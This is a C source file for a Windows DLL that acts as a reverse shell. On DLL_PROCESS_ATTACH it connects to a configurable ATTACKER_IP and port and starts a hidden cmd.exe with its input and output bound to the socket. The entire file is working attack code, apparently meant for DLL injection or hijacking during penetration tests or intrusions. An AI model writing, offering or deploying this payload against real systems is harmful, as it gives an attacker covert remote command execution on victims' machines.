#include <winsock2.h>
#include <windows.h>

/*
 * Define your IP and port for the reverse shell below
 * #define ATTACKER_IP		"127.0.0.1"
 * #define ATTACKER_PORT	1337
 */

#ifndef ATTACKER_IP
# error Need an IP
#endif

#ifndef ATTACKER_PORT
# error Need a port
#endif

void domything()
{
	// Setup WSA
	WSADATA wsa;
	if (WSAStartup(MAKEWORD(2, 2), &wsa))
		return;

	struct sockaddr_in server;
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = inet_addr(ATTACKER_IP);
	server.sin_port = htons(ATTACKER_PORT);

	SOCKET socket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);

	// Attempt to connect
	if (connect(socket, (struct sockaddr *) &server, sizeof(server)))
		return;

	STARTUPINFO info;
	memset(&info, 0, sizeof(info));
	info.cb = sizeof(info);
	info.dwFlags = STARTF_USESTDHANDLES;
	info.hStdInput = (HANDLE) socket;
	info.hStdOutput = (HANDLE) socket;
	info.hStdError = (HANDLE) socket;
	
	PROCESS_INFORMATION garbage;
	CreateProcessA(0, "cmd", 0, 0, 1, CREATE_NO_WINDOW, 0, 0, &info, &garbage);

	return;
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD d, LPVOID l)
{
	switch (d)
	{
		case DLL_PROCESS_ATTACH:
			domything();
			break;
		default:
			break;
	};

	return TRUE;
}
